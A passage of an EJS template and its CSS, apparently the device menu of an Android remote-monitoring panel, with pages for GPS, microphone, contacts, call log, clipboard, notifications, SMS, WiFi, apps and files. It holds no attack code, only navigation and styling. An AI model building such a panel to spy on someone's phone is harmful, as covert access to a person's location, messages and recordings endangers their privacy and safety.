        </a>
        <a href="<%= baseURL %>/gps" class="item menu-item <%= page==='gps' ? 'active' : '' %>">
            <i class="icon map marker alternate"></i> GPS
        </a>
        <a href="<%= baseURL %>/microphone" class="item menu-item <%= page==='microphone' ? 'active' : '' %>">
            <i class="icon microphone"></i> Microphone
        </a>
        <a href="<%= baseURL %>/contacts" class="item menu-item <%= page==='contacts' ? 'active' : '' %>">
            <i class="icon address book"></i> Contacts
        </a>
        <a href="<%= baseURL %>/calls" class="item menu-item <%= page==='calls' ? 'active' : '' %>">
            <i class="icon phone"></i> Call Log
        </a>
        <a href="<%= baseURL %>/clipboard" class="item menu-item <%= page==='clipboard' ? 'active' : '' %>">
            <i class="icon clipboard"></i> Clipboard Log
        </a>
        <a href="<%= baseURL %>/notifications" class="item menu-item <%= page==='notifications' ? 'active' : '' %>">
            <i class="icon exclamation"></i> Notification Log
        </a>
        <a href="<%= baseURL %>/sms" class="item menu-item <%= page==='sms' ? 'active' : '' %>">
            <i class="icon comments"></i> SMS Manager
        </a>
        <a href="<%= baseURL %>/wifi" class="item menu-item <%= page==='wifi' ? 'active' : '' %>">
            <i class="icon wifi"></i> WiFi Manager
        </a>
        <a href="<%= baseURL %>/apps" class="item menu-item <%= page==='apps' ? 'active' : '' %>">
            <i class="icon google play"></i> Installed Apps
        </a>
        <a href="<%= baseURL %>/permissions" class="item menu-item <%= page==='permissions' ? 'active' : '' %>">
            <i class="icon tasks"></i> Allowed Permissions
        </a>
        <a href="<%= baseURL %>/files" class="item menu-item <%= page==='files' ? 'active' : '' %>">
            <i class="icon folder open"></i> File Explorer
        </a>
        <a href="<%= baseURL %>/downloads" class="item menu-item <%= page==='downloads' ? 'active' : '' %>">
            <i class="icon download"></i> Downloads
        </a>
    </div>
</div>

<style>
    .menu-container {
        padding: 0 10px !important;
    }

    .device-menu {
        background: transparent !important;
        border-radius: 8px !important;
        overflow: hidden;
        transition: all 0.3s ease;
    }

    [data-theme="dark"] .device-menu {
        background: rgba(18, 18, 18, 0.7) !important;
        border: 1px solid var(--highlight-color) !important;
        box-shadow: 0 0 15px rgba(0, 255, 157, 0.2);
    }

    .menu-item {
        margin: 2px 0 !important;
        border-radius: 4px !important;
        transition: all 0.3s ease !important;
        font-family: 'Courier New', monospace !important;
        padding: 12px 15px !important;
    }

    [data-theme="dark"] .menu-item {
        color: var(--text-color) !important;
        border: 1px solid transparent !important;
    }

    [data-theme="dark"] .menu-item:hover {
        background-color: rgba(0, 255, 157, 0.1) !important;
        color: var(--highlight-color) !important;
        border: 1px solid var(--highlight-color) !important;
    }

    [data-theme="dark"] .menu-item.active {
        background-color: rgba(0, 255, 157, 0.15) !important;
        color: var(--highlight-color) !important;
        border: 1px solid var(--highlight-color) !important;
        box-shadow: 0 0 10px rgba(0, 255, 157, 0.3);
    }

    [data-theme="dark"] .menu-item i {
        color: var(--highlight-color) !important;
        opacity: 0.8;
        transition: all 0.3s ease;
    }

    [data-theme="dark"] .menu-item:hover i,
    [data-theme="dark"] .menu-item.active i {
        opacity: 1;
    }

    /* Hover effect */
    [data-theme="dark"] .menu-item::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(45deg, transparent, rgba(0, 255, 157, 0.1), transparent);
        transform: translateX(-100%);
        transition: transform 0.5s;
    }

    [data-theme="dark"] .menu-item:hover::before {
        transform: translateX(100%);
    }

    /* Glitch effect for active item */
    @keyframes glitch {
        0% {
            transform: translate(0);
        }
        20% {
            transform: translate(-2px, 2px);
        }
        40% {
            transform: translate(-2px, -2px);
        }
        60% {
            transform: translate(2px, 2px);
        }
        80% {
            transform: translate(2px, -2px);
        }
        100% {
            transform: translate(0);
        }
    }

    [data-theme="dark"] .menu-item.active:hover {
        animation: glitch 0.3s cubic-bezier(.25, .46, .45, .94) both infinite;
    }
</style>